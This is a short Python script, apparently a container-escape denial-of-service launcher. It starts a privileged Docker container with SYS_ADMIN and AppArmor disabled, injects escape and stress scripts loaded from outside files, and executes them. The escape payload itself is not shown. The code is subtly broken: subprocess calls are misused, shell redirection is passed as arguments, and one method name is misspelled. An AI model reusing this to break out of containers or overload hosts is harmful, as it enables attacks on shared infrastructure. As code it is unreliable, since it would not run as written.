import subprocess as sp
import time

class Dos:
    def __init__(self, trigger_time=0, container_name="ESCAPE_DOS"):
        self.trigger_time = trigger_time
        self.container_name = container_name
        sp.run(["docker", "pull", "ubuntu"])
        self.container = sp.Popen("docker run --privileged --name=ESCAPE_DOS --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash".split())
        self.commit = sp.Popen("bash")
        self.commit.communicate("docker commit ESCAPE_DOS {}".format(container_name).split())
        self.container.communicate("exit")
        #sp.run(["docker", "run", "--privileged", "--name={}".format(self.container_name), "--rm", "-it", "--cap-add=SYS_ADMIN", "--security-opt", "apparmor=unconfined", "ubuntu", "bash"],shell=True)
        self.commit.run(["docker", "ps", "-a"])

    def trigger_in(self, in_sec=0, kill_in_sec=0):
        time.sleep(in_sec)
        escape = open("escape.sh", "r").read()
        stress = open("stress.txt", "r").read()
        self.container.communicate(["docker", "exec", self.container_name, "echo", "\"{}\"".format(escape), ">", "{}.sh".format(self.container_name)])
        self.container.communicate("docker exec {} echo \"{}\" > {}.txt".format(self.container_name, stress, self.container_name).split(), shell=True)
        self.container.communucate("docker run --name=ESCAPE_DOS --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu_escape bash")
        self.commit.communicate("docker exec -it {} /{}.sh".format(self.container_name, self.container_name).split(), shell=True)


dos = Dos(container_name="escape")
dos.trigger_in()
